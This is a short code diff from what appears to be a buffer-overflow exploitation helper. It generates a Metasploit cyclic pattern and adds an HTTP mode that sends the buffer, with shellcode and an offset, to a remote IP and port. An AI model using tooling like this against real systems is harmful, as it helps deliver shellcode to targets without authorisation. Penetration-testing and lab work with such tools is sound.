@@ -88,6 +88,11 @@ class System:
 
             buffer = subprocess.check_output(['msf-pattern_create', '-l', str(config.overflow)]).strip()
 
+            if (config.mode == "http"):
+                buffer = adapter.make_request(config.remoteip, config.remoteport, config.field,
+                                              buffer,
+                                              config.shellcode, config.offset)
+
             gonext = System.input("[?] Press ENTER when you wanna send the pattern!!!")
 
             # print(buffer);
